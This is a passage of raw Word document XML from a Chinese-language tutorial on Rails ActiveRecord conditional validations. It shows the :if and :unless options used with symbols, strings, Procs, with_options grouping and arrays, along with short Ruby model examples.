        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来指定何时*应该*执行校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>unless</w:t>
      </w:r>
      <w:r w:rsidRPr="00BA5176">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来指定何时*不应该*执行校验</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364AD846"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6.1 使用 Symbol 作为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7057D81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你可以</w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">在 </w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中通过 symbol 来指定一个的方法的名称</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>这个方法会在校验前执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。这也是最常用的方法。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="195B85DF" w14:textId="77777777" w:rsidTr="00381CCD">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="750A8C7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Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="30BC0A2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:card_number,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 :if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :paid_with_card?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38DE27F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3DAF6E7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paid_with_card?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E2CC4B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payment_type == "card"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6684386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7975055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72B81C5"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6.2 使用 String 作为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1E408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你也可以使用字符串指定一段有效的 Ruby 代码，它将</w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>通过 eval 来执行</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="00381CCD">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>仅当条件很短的时候建议使用此方式</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7536"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="4BDFBCE6" w14:textId="77777777" w:rsidTr="008D05AF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="229E4C5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2DE3828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:surname,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 :if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "name.nil?"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C12E4C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15EA123"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6.3 使用 Proc 作为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:if</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:unless</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0658B6E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最后，还</w:t>
      </w:r>
      <w:r w:rsidRPr="008D05AF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>可以指定一个 Proc 对象</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="008D05AF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Proc</w:t>
      </w:r>
      <w:r w:rsidRPr="008D05AF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象可以让你将条件写在其内部，而不用单独写一个方法</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r w:rsidRPr="008D05AF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>该方式适用于单行代码</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6576"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="5978FED5" w14:textId="77777777" w:rsidTr="008D05AF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="146D60B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Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4323E0B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:password, :confirmation</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5270819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:unless</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve">=&gt; </w:t>
            </w:r>
            <w:r w:rsidRPr="00736D41">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>Proc</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>.new</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>{ |a| a.password.blank? }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4128E8D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11D507D9"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6.4 校验按条件分组</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349ADAD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有时</w:t>
      </w:r>
      <w:r w:rsidRPr="00736D41">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>多个校验以同一个条件为前提</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，这时 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>with_options</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就派上用场了。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="418397E8" w14:textId="77777777" w:rsidTr="00736D41">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33CA16C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User &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AD81A9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736D41">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>with_options</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> :if</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :is_admin? do</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|admin|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F8023C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admin.validates :</w:t>
            </w:r>
            <w:r w:rsidRPr="00736D41">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>password</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>, :length</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :minimum</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 10</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71EAB53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admin.validates :</w:t>
            </w:r>
            <w:r w:rsidRPr="00736D41">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>email</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>,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5436999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4DAEAF3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067867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736D41">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">所有在 </w:t>
      </w:r>
      <w:r w:rsidRPr="00736D41">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>with_options</w:t>
      </w:r>
      <w:r w:rsidRPr="00736D41">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 块中的校验将自动添加条件 </w:t>
      </w:r>
      <w:r w:rsidRPr="00736D41">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:if =&gt; :is_admin?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9E14EA"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6.5 组合校验条件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219529C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另一方面，</w:t>
      </w:r>
      <w:r w:rsidRPr="002D08E4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>当使用了多个条件来判定是否需要执行校验时</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="002D08E4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Array</w:t>
      </w:r>
      <w:r w:rsidRPr="002D08E4">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象就派上用场</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。此外，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E741A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
